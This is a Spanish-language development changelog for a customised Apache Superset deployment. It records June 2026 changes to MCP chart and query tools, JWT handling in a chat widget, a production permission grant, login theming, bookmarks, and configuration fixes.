- Compartido con `irex.export_to_excel` (modo SQL) vía `execute_sql_analysis` — hereda el guard de truncamiento automáticamente; `extra_tables` por ahora solo se expone en `query_dataset_sql` (paridad en export pendiente).
- No requiere el paso 6 (`always_visible`): no hay tool nuevo, solo se amplió `query_dataset_sql` ya registrado.

### 2026-06-26 (3)

Cambio realizado:
Reducción de llamadas MCP innecesarias: multi-lookup en `list_column_values` y resolución de valores ambiguos integrada en `get_query_context`.

Archivos afectados:
- `backend/src/irex/irex_mcp_tools/column_values.py` (fuente y dist)
- `backend/src/irex/irex_mcp_tools/query_context.py` (fuente y dist)
- `extensions/irex-mcp-tools-0.1.0.supx` (reempaquetado)

Que cambia o corrige:
- **`irex.list_column_values` multi-lookup**: nuevo campo `lookups: [{column, search, row_limit}]`. Permite resolver N columnas en 1 sola llamada al tool en lugar de N llamadas separadas. Los campos `column`/`search`/`row_limit` de nivel superior siguen funcionando (backward compatible). La lógica de query se extrajo a `_query_single_column()` para ser reutilizable.
- **`irex.get_query_context` con `value_hints`**: nuevo campo `value_hints: [{column, search}]`. Cuando el usuario menciona términos ambiguos (ej. "detergente", "Irex"), se pueden pasar en la misma llamada que inicializa el contexto. El tool resuelve los valores reales del dataset y los devuelve en `suggested_filters`, eliminando el ciclo get_query_context → list_column_values (×N) → query_dataset que costaba 3-7 llamadas. Requiere que `dataset_id` ya esté resuelto (por dashboard o domain).

### 2026-06-26 (2)

Cambio realizado:
Mejoras de seguridad JWT en el widget de chat MCP (`mcp_widget.py`).

Archivos afectados:
- `custom-src/login/mcp_widget.py`
- `superset_config_test.py`
- `/home/imercados/.superset/superset_config.py` (producción)

Que cambia o corrige:
- **`nbf` añadido al payload JWT**: el token no es válido antes de su emisión (`nbf = iat`). Cumple el criterio de validación estricta.
- **`jti` añadido al payload JWT**: cada token tiene un UUID único, lo que permite revocar o detectar replays en el futuro.
- **Authorization strip en proxy**: `chat_widget_api_proxy()` ya no reenvía el header `Authorization: Bearer {JWT}` del usuario al backend del chat. `"authorization"` se añadió a `_PROXY_EXCLUDED_REQUEST_HEADERS`.
- **Autenticación servidor-a-servidor**: el proxy agrega `X-Service-Secret` (nuevo secret `CHAT_BACKEND_SECRET`) para que el backend del chat valide que la petición viene de Superset, y `X-Superset-User` para identificar al usuario sin necesidad del JWT.
- **`CHAT_BACKEND_SECRET`** añadido a ambos configs (test y producción).
- El backend del chat debe adaptarse para dejar de usar el JWT del usuario y validar en su lugar el header `X-Service-Secret`. Ver resumen en el registro.

### 2026-06-26

Cambio realizado:
Se añade el tipo de gráfico `gauge` (notómetro/KPI) a `irex.chart_option`.

Archivos afectados:
- `backend/src/irex/irex_mcp_tools/chart_option.py` (fuente y dist)
- `extensions/irex-mcp-tools-0.1.0.supx` (reempaquetado)

Que cambia o corrige:
- Nuevo `chart_type="gauge"`: muestra un notómetro circular con aguja y escala de color rojo (0–60%) / amarillo (60–80%) / azul (80–100%). Diseñado para responder preguntas del tipo "¿cuál es el % de cumplimiento global?".
- Para gauge, la query se ejecuta sin dimensiones (agregado puro, `dims = []`) → 1 sola fila resultado → 1 solo KPI.
- Auto-escalado: si la métrica devuelve un ratio en escala 0–1 (ej. 0.88), se multiplica automáticamente por 100 para mostrar 88%.
- `max` del gauge se fija en 100 para métricas porcentuales (≤110), o en 125% del valor real para magnitudes absolutas.
- `x` se ignora para gauge (el modelo debe pasar cualquier columna válida del dataset).
- Descripción del tool actualizada para guiar al modelo sobre cuándo usar gauge vs heatmap/bar.

### 2026-06-25 (4)

Cambio realizado:
Fix en `irex.chart_option` (heatmap): cambio de formato de datos de `[xi, yi, val]` a `[xCategory, yCategory, val]` para que el modelo pueda leer el resultado del tool directamente sin mapear índices numéricos a nombres de categoría.

Archivos afectados:
- `backend/src/irex/irex_mcp_tools/chart_option.py` (fuente y dist)
- `extensions/irex-mcp-tools-0.1.0.supx` (reempaquetado)

Que cambia o corrige:
- **Problema**: ECharts heatmap usaba `[xi, yi, val]` (índices enteros) en los datos. Cuando el modelo leía el echarts_option devuelto por el tool para escribir el análisis, tenía que mapear mentalmente `xi=1 → xAxis.data[1] = "3-Automercado"`. En la sesión db2e6cfa el modelo confundió xi=1 ("3-Automercado") con xi=2 ("4-Megasuper"), produciendo un análisis incorrecto.
- **Fix**: ECharts 5 acepta strings de categoría en datos de heatmap con ejes tipo `category`. Ahora los datos se guardan como `["3-Automercado", "Axion", 3180]` en vez de `[1, 0, 3180]`. El tool result es auto-descriptivo — el modelo puede leer directamente qué cadena y qué marca corresponde a cada valor sin hacer ningún mapeo.
- Issues de timeout del LLM (líneas de output limit / modelo lento) en la misma sesión son problemas del backend del chat, no del MCP.

### 2026-06-25 (3)

Cambio realizado:
Bug fix en heatmap de `irex.chart_option`: las etiquetas de cada celda mostraban los tres componentes del punto de dato (`x_idx / y_idx / valor`) en vez del valor real de la métrica.

Archivos afectados:
- `backend/src/irex/irex_mcp_tools/chart_option.py` (fuente y dist)
- `extensions/irex-mcp-tools-0.1.0.supx` (reempaquetado)

Que cambia o corrige:
- **Bug crítico**: ECharts heatmap usa formato `[x_idx, y_idx, valor]` por punto. Sin formatter explícito, `label: {show: true}` renderizaba los tres números separados por `/` (ej. `0 / 4 / 12,021`). Fix: `"formatter": "{c[2]}"` muestra solo el valor real de la métrica.
- `visualMap.min` ahora usa el mínimo real de los datos en vez de `0` fijo — hace la escala de color más útil para métricas de ratio/porcentaje.
- Y-axis agrega `axisLabel: {overflow: "truncate", width: 150}` y `grid.left: "20%"` para que los nombres largos de clientes no se corten sin aviso.
- Descripción del tool actualizada: indica al modelo que para comparar dos métricas en un heatmap (ej. sell_in vs enfirme) debe pasar la expresión calculada como métrica única (`SUM(sell_in)/NULLIF(SUM(enfirme),0)*100`), no dos métricas separadas.

### 2026-06-25 (2)

Cambio realizado:
Se añade la herramienta `irex.search_dashboards` al paquete de extensiones MCP para permitir cruzar datos entre dashboards.

Archivos afectados:
- `extensions/irex-mcp-tools-0.1.0.supx` (reempaquetado)
- `backend/src/irex/irex_mcp_tools/search_dashboards.py` (nuevo, dentro del supx)
- `backend/src/irex/irex_mcp_tools/entrypoint.py` (nuevo import)

Que cambia o corrige:
- Nuevo tool `irex.search_dashboards(title, max_results)` que busca dashboards por título parcial (ILIKE, case-insensitive).
- Devuelve lista de `{id, title}` con una nota que indica al modelo qué hacer según el número de coincidencias: 0 → pedir corrección al usuario; 1 → proceder directamente; N → mostrar lista y esperar confirmación del usuario antes de cruzar datos.
- Corrige el fallo en cadena observado en el log 4abbe8d4 donde el modelo intentaba cruzar con "Reporte Actividades Comerciales" sin tener el ID numérico.

### 2026-06-25

Cambio realizado:
Se añaden nombre y apellidos del usuario al JWT del widget de chat y a los data-attributes del script.

Archivos afectados:
- `custom-src/login/mcp_widget.py`

Que cambia o corrige:
- `_generate_mcp_token` ahora acepta `first_name` y `last_name` e incluye los claims estándar `given_name`, `family_name` y `name` (nombre completo) en el payload JWT.
- El endpoint `/api/mcp-token` y el hook `inject_chat_widget` leen `current_user.first_name` / `current_user.last_name` y los pasan a `_generate_mcp_token`.
- `inject_chat_widget` añade `data-first-name` y `data-last-name` al elemento `<script>` del widget para que el chat tenga acceso directo al nombre sin necesidad de decodificar el JWT.

Nota: anotar fecha y cambio realizado con los archivos afectados y que cambia o corrige.

### 2026-06-17 (2)

Cambio realizado:
Se completó la migración de la plantilla de mensaje del flujo de recuperación de contraseña.

Archivos afectados:
- `custom-src/login/templates/general/model/message.html`
- `superset_v6_1_0/superset/templates/appbuilder/general/model/message.html`
- `custom-src/login/password_reset.py`
- `superset_v6_1_0/superset/security/password_reset.py`
- `migrate-plugins.sh`
- `PLUGINS.md`

Que cambia o corrige:
- Se agregó a `custom-src` la plantilla `appbuilder/general/model/message.html` que existía en `superset_v6`.
- Se copió la plantilla a v6.1.0 para evitar el 500 al mostrar la pantalla posterior al envío del correo o al cambio de contraseña.
- Se ajustó `migrate-plugins.sh` para copiar esa plantilla en futuras migraciones.
- Se documentó la plantilla en `PLUGINS.md` dentro del árbol canónico de login.
- `PasswordResetView._render_message()` vuelve a renderizar la pantalla de mensaje, ahora que la plantilla existe.

### 2026-06-17 (1)

Cambio realizado:
Intento inicial de corrección del 500 posterior al envío del correo de recuperación y al guardado de nueva contraseña.

Archivos afectados:
- `custom-src/login/password_reset.py`
- `superset_v6_1_0/superset/security/password_reset.py`

Que cambia o corrige:
- Se detectó que `PasswordResetView._render_message()` fallaba porque `appbuilder/general/model/message.html` no estaba migrada a v6.1.0.
- Nota: este intento fue reemplazado por la actualización `2026-06-17 (2)`, que conserva el render de la plantilla y agrega el archivo faltante al flujo de migración.

### 2026-06-11 (1)

Cambio realizado:
Se corrigió un bug del servicio MCP de Superset que hacía fallar la herramienta
`get_dashboard_info` (y potencialmente `list_dashboards`) para cualquier dashboard con roles
asignados.

Archivos afectados:
- `superset_v6_1_0/superset/mcp_service/dashboard/schemas.py`

Que cambia o corrige:
- En `dashboard_serializer` y `serialize_dashboard_object`, se reemplazó
  `RoleInfo.model_validate(role, from_attributes=True)` por una lista construida con
  `serialize_role_object(role)` (filtrando `None`), igual que ya se hacía con `owners`/
  `serialize_user_object`. El `model_validate` directo intentaba mapear `role.permissions`
  (objetos `PermissionView` de SQLAlchemy) al campo `RoleInfo.permissions: List[str]`, lo cual
  fallaba con ~140 errores de validación Pydantic por cada permiso del rol.
- En `serialize_role_object`, se cambió `perm.name` por `str(perm)`, ya que `PermissionView` no
  tiene atributo `name` — su `__repr__` (usado por `str()`) devuelve el formato
  `"<permission> on <view_menu>"` (ej. "can read on Dashboard"), que es el string esperado en
  `RoleInfo.permissions`.
- Nota: también se reinició manualmente el proceso `superset mcp run --host 0.0.0.0 --port 5008
  --debug` (no usa `--reload`) para que tomara los cambios.

### 2026-06-10 (7)

Cambio realizado:
Se otorgó el permiso `can_read on CurrentUserRestApi` (API `/api/v1/me/`) al rol **"Permiso
basico"** (id=54, ~166 usuarios) en la base de datos de producción.

Archivos/BD afectados:
- BD Postgres `superset` (producción) — tablas `ab_permission_view` (nueva fila id=905:
  `can_read` + `CurrentUserRestApi`) y `ab_permission_view_role` (nueva fila: permission_view_id=905,
  role_id=54).

Contexto / causa raíz investigada:
- En `superset_v6` (producción), `CurrentUserRestApi.get_me` / `get_my_roles` **no** tienen los
  decoradores `@protect()` + `@permission_name("read")`; solo `@expose` + `@safe`. Por eso FAB
  calcula `base_permissions = []` para esa vista y `superset init` no crea ni recrea los
  permission_view de `can_read`/`can_write on CurrentUserRestApi` (de hecho una limpieza previa de
  "permisos faltantes" los había eliminado, dejando solo el `ab_view_menu` id=27 huérfano).
- En `superset_v6_1_0` (test, 9090) esos mismos métodos **sí** tienen `@protect()` +
  `@permission_name("read")` (cambio real de Superset 6.0 → 6.1.0), por lo que en 6.1.0
  `/api/v1/me/` y `/api/v1/me/roles/` exigen `can_read on CurrentUserRestApi` y un rol sin ese
  permiso recibe 403.
- "Permiso basico" solo existe en la BD de producción (no en la sqlite de test), por lo que se
  decidió aplicar el grant únicamente en producción, como **preparación** para cuando se actualice
  a 6.1.0. Hoy no tiene efecto funcional inmediato (el código actual de `superset_v6` no valida
  ese permiso), por lo que no se reinició `superset.service`.

Que cambia o corrige:
- Cuando producción se actualice a una versión que valide `can_read on CurrentUserRestApi` (como
  6.1.0), los ~166 usuarios del rol "Permiso basico" ya tendrán acceso a `/api/v1/me/` sin recibir
  403.

Nota técnica adicional:
- Se detectó que `ab_permission_view.id` y `ab_permission_view_role.id` no tienen `DEFAULT
  nextval(...)` configurado en Postgres (aunque las secuencias `ab_permission_view_id_seq` /
  `ab_permission_view_role_id_seq` sí existen y están sincronizadas con el `MAX(id)` actual). Por
  eso el INSERT se hizo indicando explícitamente `nextval('...')` para el `id`. Si en el futuro se
  necesitan más inserciones manuales en estas tablas, hay que seguir el mismo patrón (o reparar el
  `DEFAULT` de la columna).

### 2026-06-10 (6)

Cambio realizado:
Se ajustó el banner de sugerencia de zoom (`#zoom-suggestion-banner`) para que no quede fijo
ocupando espacio de trabajo cuando los usuarios no interactúan con él.

Archivos afectados:
- `superset_v6_1_0/superset/templates/head_custom_extra.html`

Que cambia o corrige:
- Se agrega un timer de 30s que oculta el banner automáticamente si el usuario no hace clic en
  "Entendido" ni en "✕".
- El cierre (manual o automático) ya no se guarda como permanente, sino con la fecha del día
  actual (`getTodayKey()`). Al día siguiente, si se cumple la condición de zoom (>= 100%), el
  banner vuelve a mostrarse.
- El timer se cancela con `clearTimeout` si el usuario cierra el banner manualmente antes de los 30s.
- Nota: este archivo no está en el workflow de `migrate-plugins.sh` / `custom-src` (no aparece en
  PLUGINS.md); `superset_v6` (prod) tiene su propia copia que no fue tocada.

### 2026-06-10 (5)

Cambio realizado:
Se agregó el favicon al template del login.

Archivos afectados:
- `custom-src/login/templates/custom_login.html` (fuente canónica)

Que cambia o corrige:
- El login ahora referencia `/static/assets/images/favicon.png` en el `<head>` para que el navegador muestre el icono de la pestaña.

### 2026-06-10 (4)

Cambio realizado:
Se corrigió el hover de las tarjetas de características en modo oscuro.

Archivos afectados:
- `custom-src/login/static/customcss/custom_login.css` (fuente canónica)

Que cambia o corrige:
- Al pasar el puntero sobre una tarjeta en tema oscuro, ya no cambia a fondo blanco.
- El texto e iconos permanecen visibles en blanco y el hover conserva el estilo oscuro.

### 2026-06-10 (3)

Cambio realizado:
Se ajustaron los detalles visuales del panel izquierdo del login para mejorar contraste y jerarquía.

Archivos afectados:
- `custom-src/login/static/customcss/custom_login.css` (fuente canónica)

Que cambia o corrige:
- El resplandor decorativo de la esquina inferior izquierda ahora usa azul en lugar de verde.
- En tema claro, las tarjetas de características ahora tienen fondo blanco sólido, borde más visible y sombra para no perderse sobre el fondo.
- El hover de esas tarjetas también quedó reforzado para que mantengan contraste en modo claro.

### 2026-06-10 (2)

Cambio realizado:
Se ajustaron los colores del texto del panel izquierdo del login para que cambien según el tema.

Archivos afectados:
- `custom-src/login/static/customcss/custom_login.css` (fuente canónica)

Que cambia o corrige:
- En tema claro, "Bienvenido a", "Tu plataforma de análisis y visualización de datos empresariales" y las características se muestran en negro.
- En tema oscuro, esos mismos textos se muestran en blanco.
- El cambio se logra haciendo que el panel de marca herede el color del tema y removiendo los valores fijos de blanco en los textos afectados.

### 2026-06-10

Cambio realizado:
Se corrige el modal de "Novedades" en la pantalla de login, que seguía apareciendo a pesar de
haber sido "comentado".

Archivos afectados:
- `custom-src/login/templates/custom_login.html` (fuente canónica)
- `superset_v6_1_0/superset/templates/appbuilder/custom_login.html` (copia desplegada)

Causa raíz:
- El intento previo envolvía el `{% include "appbuilder/novedades.html" %}` en un comentario HTML:
  `<!-- {% include ... %} -->`. Jinja procesa las etiquetas `{% %}` como parte del motor de
  plantillas, **antes** de que el navegador interprete el HTML, por lo que el include se sigue
  ejecutando sin importar el comentario HTML que lo rodea.
- Además, `novedades.html` empieza con su propio comentario HTML
  (`<!-- Modal Novedades con Carrusel -->`). Su `-->` cierra **prematuramente** el comentario HTML
  externo, dejando todo el resto del contenido incluido (div del modal, `<style>` y `<script>`)
  como HTML activo y visible.

Fix aplicado:
- Se reemplazó el comentario HTML por un comentario de Jinja `{# ... #}`, que elimina por completo
  el `include` durante el renderizado del template:
  ```
  {# Ventana modal de Novedades (deshabilitada) #}
  {# {% include "appbuilder/novedades.html" %} #}
  ```

Nota operativa:
- `superset_test.service` (v6.1.0, puerto 9090) corre con Gunicorn sin `FLASK_DEBUG`, por lo que
  `TEMPLATES_AUTO_RELOAD` está desactivado y los workers cachean las plantillas compiladas en
  memoria. Se requiere `systemctl reload superset_test.service` (o restart) para que el cambio
  se vea reflejado.

### 2026-06-05 (6)

Cambio realizado:
Corrección completa de los dos bugs del plugin `plugin-chart-tableV3`. Esta entrada reemplaza/completa la (5).

**Bug 1 — Percentage metrics muestran 0% en filas normales con Show Summary activo**
Archivos afectados:
- `custom-plugins/plugin-chart-tableV3/src/transformProps.ts` (propagado a `superset_v6/`)

Causa raíz:
- Cuando `show_totals=true`, el backend inyecta `contribution_totals` en el post-procesado de contribución. Si hay un mismatch entre las claves del dict de totales y los nombres de columna del DataFrame principal, `contribution_totals.get(col)` retorna `None` → todas las filas quedan en 0.
- La fila de resumen ya estaba corregida (entrada 5) inyectando `%metric=1`. Las filas normales aún mostraban 0%.

Fix aplicado:
- En `transformProps.ts` (línea ~699), antes de `processDataRecords`, se computan los `%metric` client-side usando `totalQuery.data[0]` como grand total: `newRow[pctKey] = row[rawKey] / grandTotals[rawKey]`. Esto garantiza valores correctos independientemente de lo que devuelva el backend.

**Bug 2 — Sintaxis col./row. no funcionan en Calculated columns**
Archivos afectados:
- `custom-plugins/plugin-chart-tableV3/src/utils/calculatedColumns.ts` (propagado a `superset_v6/`)

Causa raíz adicional identificada:
- La regex `COL_ROW_ACCESS_REGEX = /\b(?:col|row)\.(\w+)/g` solo captura nombres con `\w+` (letras/dígitos/guión bajo). No maneja `col.{{Nombre}}` (sintaxis mixta) — dejaba `col.` como literal en el JS generado, produciendo error sintáctico.

Fix aplicado:
- Se agrega `COL_ROW_BRACE_PREFIX_REGEX = /\b(?:col|row)\.(?=\{\{)/g` que elimina el prefijo `col.`/`row.` cuando va seguido inmediatamente de `{{`. Esto normaliza `col.{{Nombre}}` → `{{Nombre}}` antes de que el paso 1 lo procese.
- Sintaxis soportadas ahora: `col.NombreSimple`, `row.NombreSimple`, `col.{{Nombre Con Espacios}}`, `row.{{Nombre Con Espacios}}`, `{{Nombre}}`.

### 2026-06-05 (5)

Cambio realizado:
Corrección parcial de bugs en `plugin-chart-tableV3` (ver entrada 6 para la versión completa).

**Bug 1 — Percentage metrics muestran 0% en el resumen (Show summary)**
Archivos afectados:
- `custom-plugins/plugin-chart-tableV3/src/transformProps.ts`

Que cambia o corrige:
- El query de totales (`buildQuery.ts`) envía `post_processing: []` al backend, eliminando la operación `contribution` que crea las columnas `%metric_name`. Por eso el row de totales llegaba al frontend sin esas columnas y el footer las mostraba vacías o con 0%.
- Fix: en `transformProps.ts`, después de obtener el raw totals, se inyectan las claves `%metric_name` con valor `1` (100 %) para cada percentage metric que no venga ya en el row. Esto es correcto porque la suma de todas las contribuciones por fila es siempre 1 (100 %).

**Bug 2 — Sintaxis col. y row. no funcionan en Calculated columns**
Archivos afectados:
- `custom-plugins/plugin-chart-tableV3/src/utils/calculatedColumns.ts`

Que cambia o corrige:
- `buildJsExpression` solo procesaba la sintaxis `{{ColumnName}}`. Las expresiones que usaban `col.NombreColumna` o `row.NombreColumna` quedaban sin sustituir y producían errores silenciosos.
- Fix: se agrega un paso de preprocesado (paso 0) con la regex `COL_ROW_ACCESS_REGEX` que normaliza `col.Name` / `row.Name` → `{{Name}}` antes de que el pipeline `{{...}}` las procese. Las columnas con espacios en el nombre siguen requiriendo la sintaxis `{{Nombre Columna}}`.

### 2026-06-05 (4)

Cambio realizado:
Se regeneraron los JSON compilados de `language_pack` para que el endpoint de idiomas no devuelva 404 en `superset_v6_1_0`.

Archivos afectados:
- `superset_v6_1_0/superset/translations/es/LC_MESSAGES/messages.json` (generado)
- `superset_v6_1_0/superset/translations/*/LC_MESSAGES/messages.json` (regenerados via `npm run build-translation`)

Que cambia o corrige:
- El endpoint `/superset/language_pack/es/` vuelve a encontrar el pack compilado de español y deja de caer en el 404 de “Language pack doesn't exist on the server”.
- Se restauraron los JSON de traducciones que consume `superset/views/core.py` al inicializar el frontend.
- Si se despliega desde fuente sin Docker, conviene ejecutar `npm run build-translation` en `superset_v6_1_0/superset-frontend` antes de arrancar `superset` para mantener estos packs presentes.

### 2026-06-05 (3)

Cambio realizado:
Marcadores aplican filtros in-place en el dashboard actual en lugar de redirigir al permalink.

Archivos afectados:
- `custom-src/FilterBarTabs/BookmarksTab.tsx` (actualizado)

Que cambia o corrige:
- Al hacer click en el nombre de un marcador, en lugar de navegar al permalink, se aplican los filtros directamente al dashboard cargado. Internamente: carga el estado guardado via `GET /api/v1/dashboard/permalink/{key}`, despacha `updateDataMask` para cada filtro del marcador y `clearDataMask` para los filtros que no estaban activos en el marcador, y opcionalmente despacha `setActiveTabs` si el marcador incluía tabs. Los charts re-fetchen automáticamente al actualizarse `state.dataMask` en Redux.
- El botón "Copy link" permanece para que el usuario pueda obtener la URL si quiere navegar manualmente.
- Se unificó la caché de detalles y payload del permalink en una sola estructura `CachedEntry` para evitar llamadas duplicadas entre "ver detalles" y "aplicar".

### 2026-06-05 (2)

Cambio realizado:
Implementación completa de la UI de marcadores en la pestaña "Bookmarks" de la barra de filtros.

Archivos afectados:
- `custom-src/FilterBarTabs/BookmarksTab.tsx` (nuevo — fuente canónica)
- `custom-src/FilterBarTabs/FilterBarTabs.tsx` (actualizado: import y uso de BookmarksTab)
- `PLUGINS.md` (sección y tabla actualizadas)

Que cambia o corrige:
- La pestaña "Bookmarks" de la barra de filtros ahora muestra la gestión completa de marcadores.
- Botón "Save current view": abre modal para nombrar y guardar el estado actual (filtros + tabs activos) via `POST /api/v1/dashboard/{id}/permalink` + `POST /api/v1/dashboard/bookmark/`.
- Lista de marcadores del dashboard actual: cada item muestra el nombre (botón que aplica los filtros), botón copiar URL, botón eliminar con confirmación (Popconfirm).
- Sección expandible por marcador: carga lazy el estado de filtros via `GET /api/v1/dashboard/permalink/{key}` y muestra nombre de filtro + valor para los filtros aplicados.
- Estado vacío con imagen cuando no hay marcadores.

### 2026-06-05

Cambio realizado:
Pestañas "Filters" / "Bookmarks" en la barra de filtros vertical del dashboard.

Archivos afectados:
- `custom-src/FilterBarTabs/FilterBarTabs.tsx` (nuevo — fuente canónica)
- `superset_v6_1_0/superset-frontend/src/dashboard/components/nativeFilters/FilterBar/FilterBarTabs/` (symlink → custom-src/FilterBarTabs/)
- `superset_v6_1_0/superset-frontend/src/dashboard/components/nativeFilters/FilterBar/Vertical.tsx` (patch)
- `migrate-plugins.sh` (paso 13 agregado)
- `PLUGINS.md` (sección y tabla actualizadas)

Que cambia o corrige:
- La barra de filtros vertical ahora muestra dos pestañas debajo del header: "Filters" (comportamiento existente) y "Bookmarks" (placeholder, se implementa en el siguiente paso).
- El componente `FilterBarTabs` reemplaza el div scrollable por un antd Tabs donde la pestaña "Filters" contiene todo el contenido original (CrossFilters + FilterControls) con el mismo área de scroll.
- Los botones Apply/Clear (actions) siguen posicionados absolutamente fuera del área de tabs, sin cambios.

### 2026-06-04

Cambio realizado:
Se deshabilito la carga de tareas de `GLOBAL_ASYNC_QUERIES` en Celery al quedar el feature flag apagado.

Archivos afectados:
- `superset_v6_1_0/superset/config.py`

Que cambia o corrige:
- Se elimina `superset.tasks.async_queries` de `CeleryConfig.imports`.
- Se eliminan las rutas `load_chart_data_into_cache` y `load_explore_json_into_cache` mientras `GLOBAL_ASYNC_QUERIES` esta desactivado.
- Corrige el error `RuntimeError: Working outside of application context` al arrancar el worker Celery.

Verificacion:
- `python -m py_compile superset/config.py`
- `timeout 15s .venv/bin/python -m celery --app=superset.tasks.celery_app:app worker --hostname=v610-test@%h --pool=solo -O fair -Q celery,sql,thumbnails,warmup --loglevel=INFO`

### 2026-06-04

Cambio realizado:
Se reemplazo el secreto temporal de `GLOBAL_ASYNC_QUERIES_JWT_SECRET` por un token seguro de mas de 32 caracteres.

Archivos afectados:
- `superset_v6_1_0/superset/config.py`

Que cambia o corrige:
- Corrige el error `AsyncQueryTokenException: Please provide a JWT secret at least 32 bytes long` al arrancar Celery con `GLOBAL_ASYNC_QUERIES` activo.
- Permite que Superset inicialice `AsyncQueryManager` durante el arranque de la app/Celery.

Verificacion:
- `.venv/bin/python -c "import superset.config; print(len(superset.config.GLOBAL_ASYNC_QUERIES_JWT_SECRET))"`
- `.venv/bin/python -m celery --app=superset.tasks.celery_app:app inspect registered`

### 2026-06-04

Cambio realizado:
Se corrigio el arranque de `superset_test` agregando el import faltante de `FixedExecutor`.

Archivos afectados:
- `superset_v6_1_0/superset/config.py`

Que cambia o corrige:
- Corrige el error `NameError: name 'FixedExecutor' is not defined` al importar `superset.config`.
- Permite usar `THUMBNAIL_EXECUTORS = [FixedExecutor("admin")]` para generar thumbnails con el usuario fijo `admin`.

Verificacion:
- `.venv/bin/python -c "import superset.config; print('ok')"`
- `python -m py_compile superset/config.py`

### 2026-06-04

Cambio realizado:
Se ajusto `THEME_DARK` en `superset_v6_1_0` para que el cambio a modo oscuro tenga fondos y textos oscuros reales.

Archivos afectados:
- `superset_v6_1_0/superset/config.py`

Que cambia o corrige:
- `THEME_DARK` deja de heredar todo `THEME_DEFAULT`, evitando arrastrar tokens claros al modo oscuro.
- Se agregan tokens explicitos de fondo/texto dark: `colorBgLayout`, `colorBgContainer`, `colorBgElevated`, `colorBgSpotlight`, `colorBorder`, `colorSplit`, `colorText`, `colorTextSecondary` y `colorTextTertiary`.
- Se conservan branding, logo, fuente y colores Irex del tema oscuro de v6.
- Se agregan overrides para `Card` y `Layout` para mejorar el contraste visual al cambiar de claro a oscuro.

Verificacion:
- `python -m py_compile superset_v6_1_0/superset/config.py`

### 2026-06-04

Cambio realizado:
Se migro el tema Irex por defecto de `superset_v6` a `superset_v6_1_0` usando los tokens de tema de Superset 6.1.0.

Archivos afectados:
- `superset_v6_1_0/superset/config.py`

Que cambia o corrige:
- `THEME_DEFAULT` recupera la paleta azul/verde, componentes y fuente del tema de v6.
- `THEME_DARK` recupera los overrides oscuros de v6 manteniendo `algorithm: "dark"`.
- Los fonts de v6 se pasan a `THEME_DEFAULT["token"]["fontUrls"]`, reemplazando el uso anterior de `CUSTOM_FONT_URLS`.
- El branding del logo se define en tokens (`brandAppName`, `brandLogoAlt`, `brandLogoUrl`, `brandLogoHref`) porque en 6.1.0 `APP_NAME` ya no controla el branding del frontend.

Verificacion:
- `python -m py_compile superset_v6_1_0/superset/config.py`

### 2026-06-04

Cambio realizado:
Se agrego `'unsafe-eval'` al `script-src` de `TALISMAN_CONFIG` en Superset v6.1.0 para permitir la compilacion runtime de templates Handlebars usada por `plugin-chart-html-cards`.

Archivos afectados:
- `superset_v6_1_0/superset/config.py`

Que cambia o corrige:
- La CSP productiva deja de bloquear `Handlebars.compile()` con el error de `unsafe-eval` cuando renderiza tarjetas HTML.
- `TALISMAN_DEV_CONFIG` ya tenia `'unsafe-eval'`; se verifico y no se duplico.

Verificacion:
- `rg -n "TALISMAN_CONFIG|TALISMAN_DEV_CONFIG|script-src" superset_v6_1_0/superset/config.py`

### 2026-06-04

Cambio realizado:
Correccion en `superset_v6_1_0` para filtros dependientes con `Select first filter value by default`.

Archivos afectados:
- `superset_v6_1_0/superset-frontend/src/dashboard/components/nativeFilters/dependencyGraph.ts`
- `superset_v6_1_0/superset-frontend/src/dashboard/components/nativeFilters/FilterBar/FilterControls/state.ts`
- `superset_v6_1_0/superset-frontend/src/dashboard/components/nativeFilters/FilterBar/FilterControls/state.test.ts`
- `superset_v6_1_0/superset-frontend/src/dashboard/components/nativeFilters/FilterBar/FilterControls/FilterValue.tsx`

Que cambia o corrige:
- Se restaura la guarda existente en v6 para padres `requiredFirst`: un filtro hijo no consulta opciones hasta que el filtro padre tenga valor y `extraFormData`.
- Corrige el caso ano -> mes donde el mes cargaba primero sin el filtro de ano, los graficos renderizaban con un mes incorrecto y luego quedaba pendiente presionar `Aplicar filtros`.
- La guarda se adapto al modelo de v6.1.0 con dependencias transitivas para cubrir cadenas de filtros.

Verificacion:
- `npx jest --runInBand src/dashboard/components/nativeFilters/FilterBar/FilterControls/state.test.ts`

### 2026-06-03 (actualización 20)

Mejoras al login personalizado: eliminar botón Novedades v6.0 y añadir toggle de tema claro/oscuro.

Archivos afectados:
- `custom-src/login/templates/custom_login.html`: eliminado botón "Novedades v6.0"; añadido script anti-parpadeo de tema en <head>; añadido botón #themeToggleBtn (sol/luna) en panel derecho
- `custom-src/login/static/customcss/custom_login.css`: variables CSS convertidas a modo dual claro/oscuro con tokens de Superset/antd; añadidos estilos .theme-toggle-btn y [data-theme="dark"]
- `custom-src/login/static/js_personal/custom_login.js`: añadida lógica toggleTheme() que escribe 'superset-theme-mode' en localStorage con valores 'dark'/'default' (misma clave y valores que usa Superset internamente)
- Propagado a superset_v6_1_0 y superset_v6

Qué cambia y por qué:
- Botón novedades eliminado a pedido del usuario.
- El toggle escribe localStorage['superset-theme-mode'] = 'dark'/'default' — la misma clave
  que ThemeController.ts (STORAGE_KEYS.THEME_MODE) usa para leer el tema al arrancar Superset.
  Así el cambio desde el login es persistido y Superset lo aplica automáticamente al entrar.
- Un script inline en <head> aplica data-theme="dark" antes de renderizar para evitar parpadeo
  (FOUC). También respeta la preferencia del OS si no hay valor guardado en localStorage.
- Las variables CSS del modo oscuro usan los tokens de antd dark theme:
  colorBgContainer=#1f1f1f, colorBgElevated=#262626, colorText=rgba(255,255,255,.88).

### 2026-06-03 (actualización 19)

Fix: animación Lottie del login no renderizaba en v6.1.0 por CSP.

Archivos afectados:
- `custom-src/login/templates/custom_login.html`: reemplazado CDN de lottie por versión self-hosted con nonce
- `custom-src/login/static/js_personal/lottie.min.js`: lottie-web 5.12.2 descargado (300KB)
- `superset_v6_1_0/superset/templates/appbuilder/custom_login.html`: propagado
- `superset_v6_1_0/superset/static/js_personal/lottie.min.js`: propagado
- `superset_v6/superset/templates/appbuilder/custom_login.html`: propagado (consistencia)
- `superset_v6/superset/static/js_personal/lottie.min.js`: propagado (consistencia)
- `migrate-plugins.sh`: paso 11c ahora incluye lottie.min.js

Qué cambia y por qué:
- En v6.1.0, TALISMAN_ENABLED=True activa la CSP con script-src='self'+'strict-dynamic'.
  El script externo de cdnjs.cloudflare.com era bloqueado por la política. En v6, TALISMAN_ENABLED=False
  por lo que no había problema.
- Solución: lottie.min.js se auto-hospeda en static/js_personal/ y se carga con nonce,
  igual que custom_login.js.

